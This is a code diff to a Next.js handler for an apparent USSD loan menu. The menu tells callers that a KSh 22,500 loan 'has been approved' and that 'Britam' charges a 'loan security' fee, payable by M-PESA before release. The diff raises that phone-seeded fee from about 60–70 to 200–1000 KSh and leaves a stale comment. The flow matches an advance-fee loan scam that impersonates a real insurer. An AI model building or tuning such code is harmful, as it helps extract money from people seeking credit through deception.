@@ -453,7 +453,7 @@ export async function POST(req: NextRequest) {
       // Option 1 Path
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const seededFee = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11); // 60-70 range
+          const seededFee = Math.floor(200 + (parseFloat(phone.slice(-3)) || 5) % 801); // 60-70 range
           return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
         }
         return respond("Invalid choice. Please select 1 or 0.", true);
@@ -494,7 +494,7 @@ export async function POST(req: NextRequest) {
       // Option 1 Flow Final Target Step
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const seededFee = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11);
+          const seededFee = Math.floor(200 + (parseFloat(phone.slice(-3)) || 5) % 801);
           const appUrl = process.env.APP_URL || "https://vercel.app";
           const callbackUrl = `${appUrl}/api/payment-callback`;
 
@@ -512,8 +512,8 @@ export async function POST(req: NextRequest) {
       // Option 2 Flow: Congratulations Offer Screen
       if (mainChoice === "2") {
         if (lastChoice === "1") {
-                    const loanProduct = isExtensionDial ? segments[1] : segments[2];
-          let seededFee = 60;
+          const loanProduct = isExtensionDial ? segments[1] : segments[2];
+          let seededFee = 200;
           const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
 
           // Apply specialized fee limits based on product selection patterns
